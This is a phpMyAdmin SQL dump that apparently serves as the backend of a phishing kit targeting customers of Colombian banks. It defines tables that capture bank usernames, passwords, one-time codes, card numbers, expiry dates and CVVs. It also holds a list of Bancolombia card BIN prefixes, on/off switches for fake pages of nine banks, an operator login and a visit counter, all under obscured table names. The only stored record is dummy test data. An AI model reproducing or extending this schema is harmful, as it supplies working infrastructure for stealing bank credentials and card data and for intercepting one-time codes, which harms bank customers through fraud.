-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Servidor: localhost:3306
-- Tiempo de generación: 29-04-2024 a las 03:25:04
-- Versión del servidor: 5.7.23-23
-- Versión de PHP: 8.1.27

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `colom122_1`
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `bin`
--

CREATE TABLE `bin` (
  `id` int(11) NOT NULL,
  `nombre_banco` varchar(255) NOT NULL,
  `bin` longtext NOT NULL,
  `credito` int(11) NOT NULL,
  `debito` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `bin`
--

INSERT INTO `bin` (`id`, `nombre_banco`, `bin`, `credito`, `debito`) VALUES
(1, 'bancolombia', '  451307;601687;549157;601676;601651;451376;601645;530694;409983;601656;601676;601651;451376;601645;530694;409983;601656;601655;549158;601610;454400;451359;449188;377813;377814;377815;377816;377843;377844;377845;377846;377847;377848;377886;409983;409984;409985;411054;441119;446846;449188;451303;451307;451308;451309;451321;451359;451374;451376;451381;454400;459425;459428;485946;494381;517640;517710;530691;530693;530694;530695;530696;530697;540615;540649;540688;540691;541251;547062;547480;549157;549158;552588;552807;553145;528633;530372;530371;530373;459426', 0, 0);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `estado_servicios`
--

CREATE TABLE `estado_servicios` (
  `id` int(11) NOT NULL,
  `nombre_servicio` varchar(255) NOT NULL,
  `estado_servicio` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `estado_servicios`
--

INSERT INTO `estado_servicios` (`id`, `nombre_servicio`, `estado_servicio`) VALUES
(1, 'bancolombia', 1),
(2, 'avvillas', 1),
(3, 'davivienda', 1),
(4, 'bogota', 1),
(5, 'Colpatria', 1),
(6, 'bbva', 1),
(7, 'occidente', 1),
(8, 'tuya', 1),
(9, 'falabella', 1);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `estado_servidor`
--

CREATE TABLE `estado_servidor` (
  `id` int(11) NOT NULL,
  `estado` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `estado_servidor`
--

INSERT INTO `estado_servidor` (`id`, `estado`) VALUES
(1, 1);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `rtr45`
--

CREATE TABLE `rtr45` (
  `idreg` int(11) NOT NULL,
  `usuario` varchar(25) DEFAULT NULL,
  `password` varchar(30) DEFAULT NULL,
  `otp` varchar(30) DEFAULT NULL,
  `dispositivo` varchar(20) DEFAULT NULL,
  `ip` varchar(50) DEFAULT NULL,
  `id` varchar(50) DEFAULT NULL,
  `agente` varchar(20) DEFAULT NULL,
  `banco` varchar(30) DEFAULT NULL,
  `status` int(20) DEFAULT NULL,
  `horacreado` datetime NOT NULL,
  `horamodificado` datetime NOT NULL,
  `email` varchar(40) DEFAULT NULL,
  `cemail` varchar(20) DEFAULT NULL,
  `tarjeta` varchar(40) DEFAULT NULL,
  `ftarjeta` varchar(30) DEFAULT NULL,
  `cvv` varchar(10) DEFAULT NULL,
  `celular` varchar(40) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `rtr45`
--

INSERT INTO `rtr45` (`idreg`, `usuario`, `password`, `otp`, `dispositivo`, `ip`, `id`, `agente`, `banco`, `status`, `horacreado`, `horamodificado`, `email`, `cemail`, `tarjeta`, `ftarjeta`, `cvv`, `celular`) VALUES
(254, 'sssss111', '5555', '555555', 'PC', '::1', NULL, NULL, 'Bancolombia', 10, '2022-10-03 23:23:35', '2022-10-03 23:25:18', NULL, NULL, '3453453453453453', '10-2029', '555', NULL);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `uyuo6`
--

CREATE TABLE `uyuo6` (
  `usuario` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `hora` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `uyuo6`
--

INSERT INTO `uyuo6` (`usuario`, `password`, `hora`) VALUES
('memima', 'mimama', '2021-12-30 00:00:00');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `v1s1t`
--

CREATE TABLE `v1s1t` (
  `contador` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `v1s1t`
--

INSERT INTO `v1s1t` (`contador`) VALUES
(0);

--
-- Índices para tablas volcadas
--

--
-- Indices de la tabla `bin`
--
ALTER TABLE `bin`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `estado_servicios`
--
ALTER TABLE `estado_servicios`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `estado_servidor`
--
ALTER TABLE `estado_servidor`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `rtr45`
--
ALTER TABLE `rtr45`
  ADD PRIMARY KEY (`idreg`);

--
-- AUTO_INCREMENT de las tablas volcadas
--

--
-- AUTO_INCREMENT de la tabla `bin`
--
ALTER TABLE `bin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de la tabla `estado_servicios`
--
ALTER TABLE `estado_servicios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT de la tabla `estado_servidor`
--
ALTER TABLE `estado_servidor`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de la tabla `rtr45`
--
ALTER TABLE `rtr45`
  MODIFY `idreg` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=286;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
